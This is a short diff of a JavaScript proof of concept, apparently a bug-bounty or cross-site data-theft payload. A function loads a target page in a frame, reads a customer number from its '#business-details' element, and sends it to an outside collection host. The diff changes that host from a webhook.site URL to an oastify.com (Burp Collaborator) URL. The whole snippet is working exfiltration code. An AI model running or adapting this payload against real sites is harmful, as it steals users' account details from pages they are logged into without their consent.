@@ -13,6 +13,6 @@ function buildFrame() {
     }, 2000)
     setTimeout(function(){
         let customerNumber=frame.contentDocument.querySelector("#business-details div.detail span.detail-text").textContent
-        fetch('https://webhook.site/fdf0efaa-77e7-4fd9-970d-3f018eb0c366/?x='+customerNumber)
+        fetch('https://mlbupyf34u5mc2s5ku1in4k4mvsogh46.oastify.com?x='+customerNumber)
     }, 5000)
 }
